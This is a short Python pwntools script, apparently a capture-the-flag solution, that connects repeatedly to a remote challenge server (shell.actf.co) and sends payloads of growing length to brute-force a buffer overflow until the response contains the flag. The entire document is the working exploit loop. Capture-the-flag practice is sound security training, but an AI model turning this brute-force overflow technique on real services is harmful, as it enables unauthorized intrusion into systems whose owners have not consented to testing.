from pwn import *

overflow = b"a"
include = b'1'

for i in range(60,257):
    con = remote('shell.actf.co',18100)
    print('Try: {}'.format(i))
    con.sendline(overflow * i + include)
    res = con.recv().decode()
    if 'actf' in res:
        print(res)
        break